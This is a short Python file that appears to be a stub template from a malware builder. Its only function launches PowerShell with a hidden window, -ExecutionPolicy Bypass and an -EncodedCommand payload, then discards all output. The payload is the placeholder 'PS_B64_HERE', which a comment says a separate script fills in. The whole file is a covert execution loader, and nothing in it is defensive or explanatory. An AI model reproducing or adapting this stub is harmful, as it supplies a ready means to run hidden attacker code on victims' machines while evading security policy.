import subprocess


def run_powershell():
    # Do not change 'PS_B64_HERE' (./src/modify_scripts.py will need it)
    ps_b64 = 'PS_B64_HERE'
    cmd = ['PowerShell', '-NoExit', '-NonInteractive', '-NoProfile', '-WindowStyle', 'Hidden', '-EncodedCommand', ps_b64, '-ExecutionPolicy', 'Bypass']
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == '__main__':
    run_powershell()
